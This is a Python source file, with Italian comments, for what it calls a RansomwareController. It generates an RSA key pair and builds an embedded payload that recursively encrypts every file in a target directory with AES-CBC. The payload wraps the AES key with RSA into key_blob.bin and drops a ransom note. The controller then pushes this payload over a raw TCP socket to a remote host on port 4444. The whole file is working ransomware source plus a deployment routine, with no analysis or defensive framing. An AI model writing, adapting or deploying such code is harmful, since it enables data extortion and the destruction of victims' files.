import socket
import logging
import base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class RansomwareController:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.public_key_pem = None

    def generate_key_pair(self):
        """Genera RSA e salva la privata. Esporta la pubblica in Base64."""
        try:
            private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            with open("private_key.pem", "wb") as f:
                f.write(private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                ))
            
            pub_bytes = private_key.public_key().public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            self.public_key_pem = base64.b64encode(pub_bytes).decode('utf-8')
            logging.info("Chiavi RSA generate correttamente.")
        except Exception as e:
            logging.error(f"Errore generazione chiavi: {e}")

    def _build_payload(self):
        """Payload: Usa un IV unico per sessione salvato correttamente nel blob."""
        return f'''
import os
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding

class Encryptor:
    def __init__(self, target_dir, b64_pub_key):
        self.target_dir = target_dir
        self.pub_key_pem = base64.b64decode(b64_pub_key)
        self.aes_key = os.urandom(32)
        self.iv = os.urandom(16)  # IV unico per tutta la sessione di cifratura

    def run(self):
        if not os.path.exists(self.target_dir): return
        
        # 1. Cifratura di tutti i file con lo STESSO IV di sessione
        for root, _, files in os.walk(self.target_dir):
            for file in files:
                file_path = os.path.join(root, file)
                self._encrypt_file(file_path)
        
        # 2. Protezione chiave: salviamo l'IV di sessione + la chiave AES cifrata
        self._save_encrypted_key()
        self._create_ransom_note()

    def _encrypt_file(self, file_path):
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            
            # Padding PKCS7
            pad = 16 - (len(data) % 16)
            data += bytes([pad]) * pad
            
            # Usiamo self.iv (l'IV di sessione)
            c = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.iv))
            enc = c.encryptor()
            
            with open(file_path, "wb") as f:
                f.write(enc.update(data) + enc.finalize())
        except Exception as e:
            print(f"Errore su {{file_path}}: {{e}}")

    def _save_encrypted_key(self):
        pub_key = serialization.load_pem_public_key(self.pub_key_pem)
        enc_key = pub_key.encrypt(
            self.aes_key,
            padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
        )
        # Il blob conterrà: 16 byte di IV + N byte di chiave AES cifrata
        with open("key_blob.bin", "wb") as f:
            f.write(self.iv + enc_key)

    def _create_ransom_note(self):
        session_id = os.urandom(4).hex().upper()
        note = f"""
============================================================
     !!! FILE CIFRATI - SESSION ID: {{session_id}} !!!
============================================================
I tuoi dati sono bloccati. Invia 'key_blob.bin' per il recupero.
============================================================
"""
        with open("RIPRISTINO_INFO.txt", "w") as f:
            f.write(note)

if __name__ == "__main__":
    e = Encryptor("./data", "{self.public_key_pem}")
    e.run()
'''

    def deploy(self):
        payload = "RUN_SCRIPT:" + self._build_payload()
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(10)
                s.connect((self.target_ip, self.target_port))
                s.sendall(payload.encode())
            logging.info("Payload inviato.")
        except Exception as e:
            logging.error(f"Errore connessione: {e}")

if __name__ == "__main__":
    controller = RansomwareController("192.168.188.129", 4444)
    controller.generate_key_pair()
    controller.deploy()